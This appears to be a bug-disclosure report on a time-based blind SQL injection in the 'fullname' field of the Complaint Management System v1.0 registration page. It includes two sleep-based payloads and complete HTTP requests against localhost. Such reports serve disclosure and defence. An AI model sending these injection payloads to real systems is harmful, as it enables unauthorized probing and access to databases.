# Complaint Management System v1.0 has SQL injection

BUG_Author: mckayyang

Website source code address: https://www.sourcecodester.com/php/14206/complaint-management-system.html

Vulnerability File: /Complaint Management System/users/registration.php

POST parameter 'fullname' exists SQL injection vulnerability

Payload1:fullname=a' and (select 1 from (select(sleep(10)))x) and 't'='t

```
POST /Complaint%20Management%20System/users/registration.php HTTP/1.1
Host: localhost
Content-Length: 140
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Complaint%20Management%20System/users/registration.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php
Connection: close

fullname=a%27+and+%28select+1+from+%28select%28sleep%2810%29%29%29x%29+and+%27t%27%3D%27t&email=b%40gmail.com&password=c&contactno=d&submit=
```

The server response time is 10 seconds

![image](https://github.com/HibuMk/bug_report/blob/main/sql1.png)

Payload2:fullname=a' and (select 1 from (select(sleep(15)))x) and 't'='t

```
POST /Complaint%20Management%20System/users/registration.php HTTP/1.1
Host: localhost
Content-Length: 140
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/Complaint%20Management%20System/users/registration.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php
Connection: close

fullname=a%27+and+%28select+1+from+%28select%28sleep%2815%29%29%29x%29+and+%27t%27%3D%27t&email=b%40gmail.com&password=c&contactno=d&submit=
```

The server response time is 15 seconds

![image](https://github.com/HibuMk/bug_report/blob/main/sql2.png)
